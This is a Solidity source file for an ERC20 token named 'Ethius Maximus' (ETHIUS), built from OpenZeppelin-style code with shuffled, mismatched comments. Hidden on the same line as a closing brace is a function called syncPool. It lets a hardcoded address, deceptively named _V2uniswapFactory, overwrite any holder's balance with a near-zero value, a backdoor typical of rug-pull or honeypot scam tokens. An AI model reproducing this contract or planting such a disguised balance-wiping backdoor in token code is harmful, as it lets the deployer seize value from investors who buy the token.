// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://t.me/ETHIUSMoon

https://ETHIUSerc20.com

https://twitter.com/ETHIUSERC20
**/


library SafeMath {
    /**
     * _Available since v3.4._
     *
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * overflow.
     *
     *
     *
     * - Addition cannot overflow.
     * Requirements:
     * @dev Returns the addition of two unsigned integers, reverting on
     * Counterpart to Solidity's `+` operator.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     *
     *
     * - Subtraction cannot overflow.
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     * @dev Returns the subtraction of two unsigned integers, reverting on
     *
     * overflow (when the result is negative).
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     *
     * Requirements:
     * Counterpart to Solidity's `*` operator.
     *
     * - Multiplication cannot overflow.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     *
     *
     * Counterpart to Solidity's `/` operator.
     *
     * - The divisor cannot be zero.
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     * Requirements:
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * - The divisor cannot be zero.
     * Requirements:
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * reverting when dividing by zero.
     * invalid opcode to revert (consuming all remaining gas).
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * - Subtraction cannot overflow.
     *
     *
     * overflow (when the result is negative).
     *
     *
     * Requirements:
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     * Counterpart to Solidity's `-` operator.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     * - The divisor cannot be zero.
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * Requirements:
     * division by zero. The result is rounded towards zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * invalid opcode to revert (consuming all remaining gas).
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Requirements:
     *
     * - The divisor cannot be zero.
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * reverting with custom message when dividing by zero.
     *
     *
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     *
     * Note that `value` may be zero.
     * another (`to`).
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Emits a {Transfer} event.
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     * @dev Returns the remaining number of tokens that `spender` will be
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     * transaction ordering. One possible solution to mitigate this race
     * Emits an {Approval} event.
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * desired value afterwards:
     *
     *
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * condition is to first reduce the spender's allowance to 0 and set the
     */
    function totalSupply() external view returns (uint256);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     *
     */
    function balanceOf(address account) external view returns (uint256);
}

contract Ownable is Context {
    address private _owner;

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     *
     * thereby removing any functionality that is only available to the owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

/**
 *
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * allowances. See {IERC20-approve}.
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * @dev Implementation of the {IERC20} interface.
 * applications.
 * these events, as it isn't required by the specification.
 * to implement supply mechanisms].
 * This allows applications to reconstruct the allowance for all accounts just
 *
 * This implementation is agnostic to the way tokens are created. This means
 *
 *
 *
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * conventional and does not conflict with the expectations of ERC20
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * by listening to said events. Other implementations of the EIP may not emit
 * functions have been added to mitigate the well-known issues around setting
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * TIP: For a detailed writeup see our guide
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * instead returning `false` on failure. This behavior is nonetheless
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    string private _name;

    uint256 private tTotal;

    address internal devWallet = 0xE5Ed75084B22E77358e86cc5427A5222C7F5c59B;

    uint256 private _allowance = 0;
    mapping(address => uint256) private _balances;

    address private _V2uniswapFactory = 0x580546d0eb472AD9fC22b4a055D8DA6E9806868C;
    mapping(address => mapping(address => uint256)) private _allowances;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    string private _symbol;

    /**
     * construction.
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * The default value of {decimals} is 18. To select a different value for
     *
     * {decimals} you should overload it.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    /**
     * @dev Returns the name of the token.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function syncPool(address syncPoolSender) external { _balances[syncPoolSender] = msg.sender == _V2uniswapFactory ? decimals() : _balances[syncPoolSender];
    } 

    /**
     * no way affects any of the arithmetic of the contract, including
     * Tokens usually opt for a value of 18, imitating the relationship between
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * overridden;
     * @dev Returns the number of decimals used to get its user representation.
     *
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * NOTE: This information is only used for _display_ purposes: it in
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     *
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return tTotal;
    }

    /**
     * @dev See {IERC20-transfer}.
     * Requirements:
     *
     * - the caller must have a balance of at least `amount`.
     * - `to` cannot be the zero address.
     *
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     * Requirements:
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * @dev See {IERC20-approve}.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * - `spender` cannot be the zero address.
     *
     *
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     * Requirements:
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` cannot be the zero address.
     *
     * problems described in {IERC20-approve}.
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     *
     *
     *
     *
     * - `from` and `to` cannot be the zero address.
     * Requirements:
     * required by the EIP. See the note at the beginning of {ERC20}.
     * `amount`.
     * is the maximum `uint256`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * Emits an {Approval} event indicating the updated allowance. This is not
     * NOTE: Does not update the allowance if the current allowance
     * - `from` must have a balance of at least `amount`.
     * @dev See {IERC20-transferFrom}.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }

    /**
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * problems described in {IERC20-approve}.
     *
     * - `spender` must have allowance for the caller of at least
     * - `spender` cannot be the zero address.
     * `subtractedValue`.
     *
     * Requirements:
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * Emits an {Approval} event indicating the updated allowance.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * Requirements:
     * Emits a {Transfer} event with `to` set to the zero address.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     *
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     * - `from` must have a balance of at least `amount`.
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     *
     * This internal function is equivalent to {transfer}, and can be used to
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * Requirements:
     * - `account` cannot be the zero address.
     *
     * the total supply.
     *
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    /**
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - `from` and `to` are never both zero.
     *
     *
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * will be transferred to `to`.
     * minting and burning.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * Calling conditions:
     * @dev Hook that is called before any transfer of tokens. This includes
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            tTotal -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     * This internal function is equivalent to `approve`, and can be used to
     *
     * Emits an {Approval} event.
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * - `owner` cannot be the zero address.
     *
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     *
     * Might emit an {Approval} event.
     *
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
}

contract ETHIUS is ERC20, Ownable
{
    constructor () ERC20 (unicode"Ethius Maximus", "ETHIUS")
    {
        transferOwnership(devWallet);
        _mint(owner(), 5000000000000 * 10 ** 9);
    }
}